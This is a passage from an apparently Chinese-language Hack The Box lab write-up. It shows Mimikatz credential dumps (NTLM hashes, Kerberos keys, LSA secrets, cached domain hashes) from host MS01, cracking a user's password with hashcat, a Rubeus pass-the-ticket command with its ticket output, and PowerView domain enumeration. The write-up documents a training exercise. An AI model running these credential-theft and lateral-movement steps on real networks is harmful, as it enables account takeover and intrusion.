         * Password : 6a 11 f6 78 86 66 26 33 c6 f8 f0 a4 2d 0d 53 84 87 d9 63 b0 24 43 c3 5a 96 06 c9 42 74 d6 09 95 30 3b b6 2f 21 50 95 2e ce 0f 82 c2 19 54 b1 5d 73 20 65 8b 10 d7 00 44 3b 76 c6 1f 72 b8 ea a5 c8 78 0e fb a3 2f 18 f4 ba d2 7b 0f b9 c5 5a 77 ce 30 e2 55 c2 ed 1b aa 4f c3 e4 54 e5 81 9c 0f 30 1c 5e da 4d ca 94 81 9c ca a5 30 2e cb 1b 2d 9d 7c 72 9a 5f 3b 41 e1 99 7f 3e 34 4d 0f f1 83 2b f4 7f af a1 bc c0 e1 0f de a9 3f 9d dc 30 61 fe 7a 77 ad 7a 11 ea 17 73 c8 35 f5 b6 b6 a5 d9 5c b9 10 1a e2 6f db ea 80 9c 45 8f 9d 8a ea d8 a9 f1 27 c2 e9 31 60 06 47 d6 6d 9a 66 f3 07 dd d3 4a 03 99 bb 63 c4 81 be 21 90 2e 68 66 c7 44 36 dd c6 b4 26 53 0d 73 74 30 32 21 da 3c 8f ed e9 d2 40 af dc 9a ce 2e a3 3e 2f e5 0e 66 71 da
        ssp :
        credman :

Authentication Id : 0 ; 47868 (00000000:0000bafc)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 3/24/2026 8:59:27 PM
SID               : S-1-5-96-0-0
        msv :
         [00000003] Primary
         * Username : MS01$
         * Domain   : MEGAAIRLINE
         * NTLM     : 4d305ab2eb40418cb6e92214e8412b85
         * SHA1     : 130a4cff411e90a016f4d74ecbffc5b77c14ef0d
         * DPAPI    : 130a4cff411e90a016f4d74ecbffc5b7
        tspkg :
        wdigest :
         * Username : MS01$
         * Domain   : MEGAAIRLINE
         * Password : (null)
        kerberos :
         * Username : MS01$
         * Domain   : megaairline.local
         * Password : 6a 11 f6 78 86 66 26 33 c6 f8 f0 a4 2d 0d 53 84 87 d9 63 b0 24 43 c3 5a 96 06 c9 42 74 d6 09 95 30 3b b6 2f 21 50 95 2e ce 0f 82 c2 19 54 b1 5d 73 20 65 8b 10 d7 00 44 3b 76 c6 1f 72 b8 ea a5 c8 78 0e fb a3 2f 18 f4 ba d2 7b 0f b9 c5 5a 77 ce 30 e2 55 c2 ed 1b aa 4f c3 e4 54 e5 81 9c 0f 30 1c 5e da 4d ca 94 81 9c ca a5 30 2e cb 1b 2d 9d 7c 72 9a 5f 3b 41 e1 99 7f 3e 34 4d 0f f1 83 2b f4 7f af a1 bc c0 e1 0f de a9 3f 9d dc 30 61 fe 7a 77 ad 7a 11 ea 17 73 c8 35 f5 b6 b6 a5 d9 5c b9 10 1a e2 6f db ea 80 9c 45 8f 9d 8a ea d8 a9 f1 27 c2 e9 31 60 06 47 d6 6d 9a 66 f3 07 dd d3 4a 03 99 bb 63 c4 81 be 21 90 2e 68 66 c7 44 36 dd c6 b4 26 53 0d 73 74 30 32 21 da 3c 8f ed e9 d2 40 af dc 9a ce 2e a3 3e 2f e5 0e 66 71 da
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : MS01$
Domain            : MEGAAIRLINE
Logon Server      : (null)
Logon Time        : 3/24/2026 8:59:23 PM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : MS01$
         * Domain   : MEGAAIRLINE
         * Password : (null)
        kerberos :
         * Username : ms01$
         * Domain   : MEGAAIRLINE.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 7715081 (00000000:0075b909)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 3/25/2026 4:29:32 AM
SID               : S-1-5-96-0-2
        msv :
         [00000003] Primary
         * Username : MS01$
         * Domain   : MEGAAIRLINE
         * NTLM     : 4d305ab2eb40418cb6e92214e8412b85
         * SHA1     : 130a4cff411e90a016f4d74ecbffc5b77c14ef0d
         * DPAPI    : 130a4cff411e90a016f4d74ecbffc5b7
        tspkg :
        wdigest :
         * Username : MS01$
         * Domain   : MEGAAIRLINE
         * Password : (null)
        kerberos :
         * Username : MS01$
         * Domain   : megaairline.local
         * Password : 6a 11 f6 78 86 66 26 33 c6 f8 f0 a4 2d 0d 53 84 87 d9 63 b0 24 43 c3 5a 96 06 c9 42 74 d6 09 95 30 3b b6 2f 21 50 95 2e ce 0f 82 c2 19 54 b1 5d 73 20 65 8b 10 d7 00 44 3b 76 c6 1f 72 b8 ea a5 c8 78 0e fb a3 2f 18 f4 ba d2 7b 0f b9 c5 5a 77 ce 30 e2 55 c2 ed 1b aa 4f c3 e4 54 e5 81 9c 0f 30 1c 5e da 4d ca 94 81 9c ca a5 30 2e cb 1b 2d 9d 7c 72 9a 5f 3b 41 e1 99 7f 3e 34 4d 0f f1 83 2b f4 7f af a1 bc c0 e1 0f de a9 3f 9d dc 30 61 fe 7a 77 ad 7a 11 ea 17 73 c8 35 f5 b6 b6 a5 d9 5c b9 10 1a e2 6f db ea 80 9c 45 8f 9d 8a ea d8 a9 f1 27 c2 e9 31 60 06 47 d6 6d 9a 66 f3 07 dd d3 4a 03 99 bb 63 c4 81 be 21 90 2e 68 66 c7 44 36 dd c6 b4 26 53 0d 73 74 30 32 21 da 3c 8f ed e9 d2 40 af dc 9a ce 2e a3 3e 2f e5 0e 66 71 da
        ssp :
        credman :

Authentication Id : 0 ; 78759 (00000000:000133a7)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 3/24/2026 8:59:29 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : MS01$
         * Domain   : MEGAAIRLINE
         * NTLM     : 4d305ab2eb40418cb6e92214e8412b85
         * SHA1     : 130a4cff411e90a016f4d74ecbffc5b77c14ef0d
         * DPAPI    : 130a4cff411e90a016f4d74ecbffc5b7
        tspkg :
        wdigest :
         * Username : MS01$
         * Domain   : MEGAAIRLINE
         * Password : (null)
        kerberos :
         * Username : MS01$
         * Domain   : megaairline.local
         * Password : 6a 11 f6 78 86 66 26 33 c6 f8 f0 a4 2d 0d 53 84 87 d9 63 b0 24 43 c3 5a 96 06 c9 42 74 d6 09 95 30 3b b6 2f 21 50 95 2e ce 0f 82 c2 19 54 b1 5d 73 20 65 8b 10 d7 00 44 3b 76 c6 1f 72 b8 ea a5 c8 78 0e fb a3 2f 18 f4 ba d2 7b 0f b9 c5 5a 77 ce 30 e2 55 c2 ed 1b aa 4f c3 e4 54 e5 81 9c 0f 30 1c 5e da 4d ca 94 81 9c ca a5 30 2e cb 1b 2d 9d 7c 72 9a 5f 3b 41 e1 99 7f 3e 34 4d 0f f1 83 2b f4 7f af a1 bc c0 e1 0f de a9 3f 9d dc 30 61 fe 7a 77 ad 7a 11 ea 17 73 c8 35 f5 b6 b6 a5 d9 5c b9 10 1a e2 6f db ea 80 9c 45 8f 9d 8a ea d8 a9 f1 27 c2 e9 31 60 06 47 d6 6d 9a 66 f3 07 dd d3 4a 03 99 bb 63 c4 81 be 21 90 2e 68 66 c7 44 36 dd c6 b4 26 53 0d 73 74 30 32 21 da 3c 8f ed e9 d2 40 af dc 9a ce 2e a3 3e 2f e5 0e 66 71 da
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : MS01$
Domain            : MEGAAIRLINE
Logon Server      : (null)
Logon Time        : 3/24/2026 8:59:28 PM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : MS01$
         * Domain   : MEGAAIRLINE
         * NTLM     : 4d305ab2eb40418cb6e92214e8412b85
         * SHA1     : 130a4cff411e90a016f4d74ecbffc5b77c14ef0d
         * DPAPI    : 130a4cff411e90a016f4d74ecbffc5b7
        tspkg :
        wdigest :
         * Username : MS01$
         * Domain   : MEGAAIRLINE
         * Password : (null)
        kerberos :
         * Username : ms01$
         * Domain   : MEGAAIRLINE.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 7746937 (00000000:00763579)
Session           : RemoteInteractive from 2
User Name         : elliot
Domain            : MS01
Logon Server      : MS01
Logon Time        : 3/25/2026 4:29:32 AM
SID               : S-1-5-21-1499087434-960912774-2499544307-1003
        msv :
         [00000003] Primary
         * Username : elliot
         * Domain   : MS01
         * NTLM     : 07c5c02992bded63e4f74126e65e308b
         * SHA1     : 478da8a98d7a329ee3d6ffb22eb539a4ef3e0eb4
         * DPAPI    : 478da8a98d7a329ee3d6ffb22eb539a4
        tspkg :
        wdigest :
         * Username : elliot
         * Domain   : MS01
         * Password : (null)
        kerberos :
         * Username : elliot
         * Domain   : MS01
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 3/24/2026 8:59:29 PM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 46547 (00000000:0000b5d3)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 3/24/2026 8:59:24 PM
SID               :
        msv :
         [00000003] Primary
         * Username : MS01$
         * Domain   : MEGAAIRLINE
         * NTLM     : 4d305ab2eb40418cb6e92214e8412b85
         * SHA1     : 130a4cff411e90a016f4d74ecbffc5b77c14ef0d
         * DPAPI    : 130a4cff411e90a016f4d74ecbffc5b7
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :
```

#### lsadump::sam
```bash
mimikatz # lsadump::sam
Domain : MS01
SysKey : 90f5421891c9e26f038203ffeae531dc
Local SID : S-1-5-21-1499087434-960912774-2499544307

SAMKey : 9e6c8ed6d8aa503bbf0983a3a4bb3e49

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 78350c7b3c5fe865d954d5b47013e21f

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : f73f7d7524a71d25d376c0b14752b53b

* Primary:Kerberos-Newer-Keys *
    Default Salt : MS01Administrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 4029ba49cfa8908b4d49974eb6118b351804e84416b4fd74e6ffe00c75ee3e85
      aes128_hmac       (4096) : 1f6df8f974f03e8525027742f5e0359c
      des_cbc_md5       (4096) : 7938703dbaab137f
    OldCredentials
      aes256_hmac       (4096) : 003f94c1e52b6d4884103632ce5b390311dd4d7f37c6b2f792e9c9f0caef2baf
      aes128_hmac       (4096) : 1bd418b52a14ab15399dfc60ebaab0f5
      des_cbc_md5       (4096) : 150ef2d673293d2a

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : MS01Administrator
    Credentials
      des_cbc_md5       : 7938703dbaab137f
    OldCredentials
      des_cbc_md5       : 150ef2d673293d2a


RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: 3131accf305954967753590a4bc57daa

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 2f16a6750c23a37f38f929103247f0d3

* Primary:Kerberos-Newer-Keys *
    Default Salt : WDAGUtilityAccount
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : c115090f50d471920c6d405b6b8c973fa76475d1e0e1125c5480d9396b3c2fac
      aes128_hmac       (4096) : e5faa2ca5d3a588c9d7d68d839c80596
      des_cbc_md5       (4096) : e06419765e389d85

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WDAGUtilityAccount
    Credentials
      des_cbc_md5       : e06419765e389d85


RID  : 000003e9 (1001)
User : sshd
  Hash NTLM: 1df4fb8a87e9ea258720fe61f5f3867f
    lm  - 0: 38fea1e19827dcdab92d0548a25e755c
    ntlm- 0: 1df4fb8a87e9ea258720fe61f5f3867f

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 280ce946fa68d39a352c31a3b7c18619

* Primary:Kerberos-Newer-Keys *
    Default Salt : MS01.MEGAAIRLINE.LOCALsshd
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : d1f7759edbce332bd4e897e1117870ec0973d8927ebcfaa76cff9adca74ab0cd
      aes128_hmac       (4096) : 407b887174a80ec628253b6d6da80550
      des_cbc_md5       (4096) : a27ab34c2f70e6df

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : MS01.MEGAAIRLINE.LOCALsshd
    Credentials
      des_cbc_md5       : a27ab34c2f70e6df


RID  : 000003eb (1003)
User : elliot
  Hash NTLM: 07c5c02992bded63e4f74126e65e308b
    lm  - 0: c6c4a67ba4b2c69890c1a1e66e3ff884
    ntlm- 0: 07c5c02992bded63e4f74126e65e308b

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : a3f2a3ce424cec78524afcaaed09beaf

* Primary:Kerberos-Newer-Keys *
    Default Salt : MS01.MEGAAIRLINE.LOCALelliot
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 25655e23c3dcecdaa1a79281b179731b15c0b710a47a1cd7a391cda6af4d62a8
      aes128_hmac       (4096) : 67ed488f5c4ea6a146313db3b64f5614
      des_cbc_md5       (4096) : 76f87c4a490d2689

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : MS01.MEGAAIRLINE.LOCALelliot
    Credentials
      des_cbc_md5       : 76f87c4a490d2689
```

#### lsadump::secrets
```bash
mimikatz # lsadump::secrets
Domain : MS01
SysKey : 90f5421891c9e26f038203ffeae531dc

Local name : MS01 ( S-1-5-21-1499087434-960912774-2499544307 )
Domain name : MEGAAIRLINE ( S-1-5-21-775547830-308377188-957446042 )
Domain FQDN : megaairline.local

Policy subsystem is : 1.18
LSA Key(s) : 1, default {20077035-3b36-67c0-54c5-da7a67c535ce}
  [00] {20077035-3b36-67c0-54c5-da7a67c535ce} 54822794065915b94a866d914751cbfbc122c944eeae524532749b5b8c389d5e

Secret  : $MACHINE.ACC
cur/hex : 6a 11 f6 78 86 66 26 33 c6 f8 f0 a4 2d 0d 53 84 87 d9 63 b0 24 43 c3 5a 96 06 c9 42 74 d6 09 95 30 3b b6 2f 21 50 95 2e ce 0f 82 c2 19 54 b1 5d 73 20 65 8b 10 d7 00 44 3b 76 c6 1f 72 b8 ea a5 c8 78 0e fb a3 2f 18 f4 ba d2 7b 0f b9 c5 5a 77 ce 30 e2 55 c2 ed 1b aa 4f c3 e4 54 e5 81 9c 0f 30 1c 5e da 4d ca 94 81 9c ca a5 30 2e cb 1b 2d 9d 7c 72 9a 5f 3b 41 e1 99 7f 3e 34 4d 0f f1 83 2b f4 7f af a1 bc c0 e1 0f de a9 3f 9d dc 30 61 fe 7a 77 ad 7a 11 ea 17 73 c8 35 f5 b6 b6 a5 d9 5c b9 10 1a e2 6f db ea 80 9c 45 8f 9d 8a ea d8 a9 f1 27 c2 e9 31 60 06 47 d6 6d 9a 66 f3 07 dd d3 4a 03 99 bb 63 c4 81 be 21 90 2e 68 66 c7 44 36 dd c6 b4 26 53 0d 73 74 30 32 21 da 3c 8f ed e9 d2 40 af dc 9a ce 2e a3 3e 2f e5 0e 66 71 da
    NTLM:4d305ab2eb40418cb6e92214e8412b85
    SHA1:130a4cff411e90a016f4d74ecbffc5b77c14ef0d
old/hex : 5a d4 74 68 7b ad 54 4e 5b b8 4a 11 88 32 b1 48 5d 1a 09 b6 15 1c bb 51 45 61 d2 ff 93 6c 09 91 49 d9 74 48 cb c7 51 d0 f8 ab 22 cd a6 d9 34 63 51 c3 2d 87 09 83 c6 43 be 9a f8 f1 c9 28 cd fb 08 2b b2 48 a3 56 5d ea 75 07 48 1a a4 39 6b 06 2f 3a 2e c5 cf 14 fe c8 3c e6 54 17 c4 c1 96 99 8c 2c 67 a2 06 f9 cc 71 8f d3 fe c4 9c ea 56 d7 04 6b 9f ca 71 5d 3f db 91 9f e6 18 91 5e f1 27 72 a4 9b 8c 55 e1 79 23 c6 d5 ca 3e 67 a2 56 c6 09 bc a4 90 ed ee f8 f8 c8 b8 b4 ea c5 f5 62 42 db 07 40 81 da 81 d2 77 9c af 36 fb bb fd 9e fb d0 48 40 03 70 07 87 81 ab 6b ab 96 de ba 59 f0 b5 fa 2e fd 6c 6a 87 ea 9a 7d a4 4f 58 89 bc 99 a4 cd 84 55 fe 00 18 6d b4 88 b7 07 70 eb cc 30 e9 2b 12 8a c2 6e ed 3d 5f cb 7f 23 f5 c4 66 4e
    NTLM:345484acd019ef0a90854fe0ca320421
    SHA1:e8ad8ef59063dbe29aaf97f1b380fcb302b3fac6

Secret  : DefaultPassword

Secret  : DPAPI_SYSTEM
cur/hex : 01 00 00 00 48 77 72 fb ff ed cc d0 8b 08 23 9a f2 5f 7c 42 a0 c2 ab 76 36 cb ed e3 24 13 36 b3 48 93 57 4f 96 c2 7a 74 11 f1 8a 6c
    full: 487772fbffedccd08b08239af25f7c42a0c2ab7636cbede3241336b34893574f96c27a7411f18a6c
    m/u : 487772fbffedccd08b08239af25f7c42a0c2ab76 / 36cbede3241336b34893574f96c27a7411f18a6c
old/hex : 01 00 00 00 9a 97 a0 88 05 12 ef b7 dc 51 61 c2 91 5e f0 b3 59 39 69 e0 74 e9 bd 79 fa 6c 9c 8c 83 a2 a1 4d 3a c5 2c d9 c9 9c 9b 1e
    full: 9a97a0880512efb7dc5161c2915ef0b3593969e074e9bd79fa6c9c8c83a2a14d3ac52cd9c99c9b1e
    m/u : 9a97a0880512efb7dc5161c2915ef0b3593969e0 / 74e9bd79fa6c9c8c83a2a14d3ac52cd9c99c9b1e

Secret  : NL$KM
cur/hex : 33 eb 2a 1d a2 af f4 43 ec af 9f 47 4d f4 85 79 87 a8 4e 71 64 8f d0 0f 94 e3 04 13 05 cd da 92 9b d1 eb 02 ea 26 6e 4b 0e 77 99 6a 29 73 7c 20 d1 76 7b b6 3e 7f 42 cf 10 8a aa 01 d8 49 88 3d
old/hex : 33 eb 2a 1d a2 af f4 43 ec af 9f 47 4d f4 85 79 87 a8 4e 71 64 8f d0 0f 94 e3 04 13 05 cd da 92 9b d1 eb 02 ea 26 6e 4b 0e 77 99 6a 29 73 7c 20 d1 76 7b b6 3e 7f 42 cf 10 8a aa 01 d8 49 88 3d

Secret  : _SC_MSSQL$SQLEXPRESS / service 'MSSQL$SQLEXPRESS' with username : NT Service\MSSQL$SQLEXPRESS

Secret  : _SC_SQLTELEMETRY$SQLEXPRESS / service 'SQLTELEMETRY$SQLEXPRESS' with username : NT Service\SQLTELEMETRY$SQLEXPRESS
```

#### lsadump::cache
```bash
mimikatz # lsadump::cache
Domain : MS01
SysKey : 90f5421891c9e26f038203ffeae531dc

Local name : MS01 ( S-1-5-21-1499087434-960912774-2499544307 )
Domain name : MEGAAIRLINE ( S-1-5-21-775547830-308377188-957446042 )
Domain FQDN : megaairline.local

Policy subsystem is : 1.18
LSA Key(s) : 1, default {20077035-3b36-67c0-54c5-da7a67c535ce}
  [00] {20077035-3b36-67c0-54c5-da7a67c535ce} 54822794065915b94a866d914751cbfbc122c944eeae524532749b5b8c389d5e

* Iteration is set to default (10240)

[NL$1 - 10/22/2024 6:03:41 AM]
RID       : 000001f4 (500)
User      : MEGAAIRLINE\Administrator
MsCacheV2 : 3ea6e70c7142de7e521195f33086a2bf

[NL$2 - 10/16/2020 8:54:05 AM]
RID       : 00000454 (1108)
User      : MEGAAIRLINE\elliot
MsCacheV2 : 1985a8159434672943be0d4f94cea4b2

[NL$3 - 10/14/2020 7:54:00 AM]
RID       : 00000835 (2101)
User      : MEGAAIRLINE\anna
MsCacheV2 : beff6c5d84183e72d1ef69f18051ed49
```

## hashcat
> 将anna的hash进行破解，密码将过去的凭据进行保存，看看是否存在密码复用
>
> 得到密码为FWErfsgt4ghd7f6dwx
>

```bash
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Ascension]
└─# hashcat -m 1000 beff6c5d84183e72d1ef69f18051ed49 password
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-AMD Ryzen 7 6800HS with Radeon Graphics, 2930/5861 MB (1024 MB allocatable), 4MCU

Dictionary cache built:
* Filename..: password
* Passwords.: 1
* Bytes.....: 19
* Keyspace..: 1
* Runtime...: 0 secs

Session..........: hashcat                                
Status...........: Exhausted
Hash.Mode........: 1000 (NTLM)
Hash.Target......: beff6c5d84183e72d1ef69f18051ed49
Time.Started.....: Wed Mar 25 21:05:14 2026 (0 secs)
Time.Estimated...: Wed Mar 25 21:05:14 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (password)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:     1939 H/s (0.00ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 1/1 (100.00%)
Rejected.........: 0/1 (0.00%)
Restore.Point....: 1/1 (100.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: FWErfsgt4ghd7f6dwx -> FWErfsgt4ghd7f6dwx
Hardware.Mon.#01.: Util: 18%

Started: Wed Mar 25 21:05:13 2026
Stopped: Wed Mar 25 21:05:16 2026
```

## 横向移动
### net use(失败)
> 错误 2240 = anna 账户设置了工作站登录限制，MS01 不在允许列表里
>

```bash
PS C:\inetpub\wwwroot> net use \\dc2.megaairline.local\NETLOGON 'FWErfsgt4ghd7f6dwx' /user:megaairline.local\anna
```

![](/image/hackthebox-prolabs/Ascension-18.png)

### rubeus
```bash
Rubeus2.2.exe asktgt /domain:megaairline.local /dc:dc2 /user:anna /password:FWErfsgt4ghd7f6dwx /createnetonly:C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe /show /ptt
```

```bash
C:\Users\elliot.MS01\Downloads>Rubeus.exe asktgt /domain:megaairline.local /dc:dc2 /user:anna /password:FWErfsgt4ghd7f6dwx /createnetonly:C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe /show /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: Ask TGT

[*] Showing process : True
[*] Username        : 4ID1YHYX
[*] Domain          : ZSVOAD0V
[*] Password        : QSOVQRX3
[+] Process         : 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 5336
[+] LUID            : 0xc5bcbb

[*] Using rc4_hmac hash: 78350C7B3C5FE865D954D5B47013E21F
[*] Building AS-REQ (w/ preauth) for: 'megaairline.local\anna'
[*] Target LUID : 12958907
[*] Using domain controller: 192.168.11.201:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFmDCCBZSgAwIBBaEDAgEWooIEojCCBJ5hggSaMIIElqADAgEFoRMbEU1FR0FBSVJMSU5FLkxPQ0FM
      oiYwJKADAgECoR0wGxsGa3JidGd0GxFtZWdhYWlybGluZS5sb2NhbKOCBFAwggRMoAMCARKhAwIBAqKC
      BD4EggQ6tLOSj3ZiJ5JSEyHHFVH7aIm7kxhj/GsriPqJGLzP2wURSXSXgbBXOJa+wdt8hthR2hxomly0
      zs54BuRuXgU+vmqALu7tEMfvkpSs0z0E9vI8OQYz+jJdJqi6iOGZai7kneJQnoyI+PcpzgHE+bIGrep+
      WVBO7FHVOyqNkgAzuOsyi94kJUyeGCmBoMSCnFRBPhbGUlpFY1AnK0m2RMTcvQsHF0r17qemVYV0/BeM
      RYeqBdL2Zy4unLsLFfGq6gK/lsWTjH+IHQb/m5liCb7Nfr86M95EBcrBmonu+vA+GJl/xaSa/Y5XMZEH
      TLhJFXRaHt0CFtwv57/u79M+znsmYWp+tVU2J6/XP/g3Emz9MY99Wz0EHx1Ld+XFzvKJFAd2KciZD+1h
      G5LsDTxiqInZVZ0o3W7TQR01rwLZNOaBjTdK7LqlYKMoVIt5f1rkO8DTfmNATRdLS+RVIEplWRncvIZT
      uX/3t/dEutpTol+/VQMYJ4KNRNIwk7uyNeU3TiGRx7UuffXFbulPJKSBfLlk46HAMfQjojFw61t4YKqK
      E+PaXlhNn3y8qA2+S3ykCBx/o4YgJARJNnng03QrXdK5xh+KCJdZfDFS5dN5Rt9JPK2t8OrsURoN2Lkz
      VwK0rGMZ0XuB4GpJUkjfK8xBcVD0ektTTlZtl0Tx9H23KP18r8gRMnw9MPY5Ftxq5odi0TRTm40UdEOl
      2WCIk1MfYhunIit3A60iq7KC4S/8w5xx5Y3b8IOLFgODYRErn9mHGRI23JXGKirlxemgG5/KiS6S7y8l
      dWur9SbVvuTeldgQOdBg+1NzyUgINo1TduueWJd/zXPAVsd/aE3csjbTgn2PtTS7WSwLnJ2RhLMZZCgZ
      DJpzNLt4P9/bKG8/YyaJI9VCaqgqrqc2ngxIhvS6pW7C1MuwGf67/xSEXlNQPNSVpHDf39Q7eQPEH4c6
      epipIbiRcvp0g2F8ifA+4jdhHy0EMAr0H+t5EJiKvY0LA95iNSWK2ltpaCYCO4FMuOlUZlNl3Olh+fkq
      Y+viLJ0S935s0hmUDbQ6J0vmQzJE/Vv/0IwGA6RdnGjcaeGdlQCMt008e8dMoIJcNBhL4MzJKil9BI4X
      qj9aQKZFZTNWmafuwClTF9/GTwFOSD/yRQWzOPSPb52OMoV6Gz+gluVJ16pQ2evMeELsmP9tCGsTfahh
      wSqmiQ0C4xnH13iuyOEbttz/wNm0wporlBcfQLJQv+F1uj15IZhn4oF4TEga7ZnE1x/wf6CKdeN6vY9O
      /il+v1k3XSUVDbuP+LXTtUewwA/+EsNl69CLADiY6GXQsA3GAZQfxY3MiiI5yWs/1xSwKZ93UAxKnuMp
      YfeRaFwyZdy9KnHF98Qc4zKv3dWhltMUG6udrWF3DWNLwzj18uptUqQFbQSARglxIIk0dTOovUkoYu4q
      /nfHUZepmRqjgeEwgd6gAwIBAKKB1gSB032B0DCBzaCByjCBxzCBxKAbMBmgAwIBF6ESBBB9rcWB+0Db
      dvFzpU5ZHp2UoRMbEU1FR0FBSVJMSU5FLkxPQ0FMohEwD6ADAgEBoQgwBhsEYW5uYaMHAwUAQOEAAKUR
      GA8yMDI2MDMyNTE1Mzc0M1qmERgPMjAyNjAzMjYwMTM3NDNapxEYDzIwMjYwNDAxMTUzNzQzWqgTGxFN
      RUdBQUlSTElORS5MT0NBTKkmMCSgAwIBAqEdMBsbBmtyYnRndBsRbWVnYWFpcmxpbmUubG9jYWw=
[*] Target LUID: 0xc5bcbb
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/megaairline.local
  ServiceRealm             :  MEGAAIRLINE.LOCAL
  UserName                 :  anna
  UserRealm                :  MEGAAIRLINE.LOCAL
  StartTime                :  3/25/2026 8:37:43 AM
  EndTime                  :  3/25/2026 6:37:43 PM
  RenewTill                :  4/1/2026 8:37:43 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  fa3FgftA23bxc6VOWR6dlA==
  ASREP (key)              :  78350C7B3C5FE865D954D5B47013E21F
```

## powerview
> 在注入票据的powershell中运行，以 anna 的 Kerberos 上下文运行
>

```bash
Import-Module .\PowerView.ps1
```

### 枚举megaairline域用户
```bash


logoncount             : 125
badpasswordtime        : 10/1/2024 4:15:47 AM
description            : Built-in account for administering the computer/domain
distinguishedname      : CN=Administrator,CN=Users,DC=megaairline,DC=local
objectclass            : {top, person, organizationalPerson, user}
lastlogontimestamp     : 10/22/2024 6:03:40 AM
name                   : Administrator
objectsid              : S-1-5-21-775547830-308377188-957446042-500
samaccountname         : Administrator
admincount             : 1
codepage               : 0
samaccounttype         : USER_OBJECT
accountexpires         : NEVER
countrycode            : 0
whenchanged            : 10/22/2024 1:03:40 PM
instancetype           : 4
objectguid             : 11b41f27-770e-4319-b616-5e60be9c8a57
lastlogon              : 10/23/2024 5:28:41 AM
lastlogoff             : 12/31/1600 4:00:00 PM
objectcategory         : CN=Person,CN=Schema,CN=Configuration,DC=megaairline,DC=local
dscorepropagationdata  : {10/10/2020 4:02:29 PM, 10/10/2020 4:02:29 PM, 10/10/2020 3:47:20 PM, 1/1/1601 6:12:16 PM}
memberof               : {CN=Group Policy Creator Owners,CN=Users,DC=megaairline,DC=local, CN=Domain 
                         Admins,CN=Users,DC=megaairline,DC=local, CN=Enterprise 
                         Admins,CN=Users,DC=megaairline,DC=local, CN=Schema Admins,CN=Users,DC=megaairline,DC=local...}
whencreated            : 10/10/2020 3:46:25 PM
iscriticalsystemobject : True
badpwdcount            : 0
cn                     : Administrator
useraccountcontrol     : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
usncreated             : 8196
primarygroupid         : 513
pwdlastset             : 10/10/2020 8:51:36 AM
usnchanged             : 159820

pwdlastset             : 12/31/1600 4:00:00 PM
logoncount             : 0
badpasswordtime        : 12/31/1600 4:00:00 PM
description            : Built-in account for guest access to the computer/domain
distinguishedname      : CN=Guest,CN=Users,DC=megaairline,DC=local
objectclass            : {top, person, organizationalPerson, user}
name                   : Guest
objectsid              : S-1-5-21-775547830-308377188-957446042-501
samaccountname         : Guest
codepage               : 0
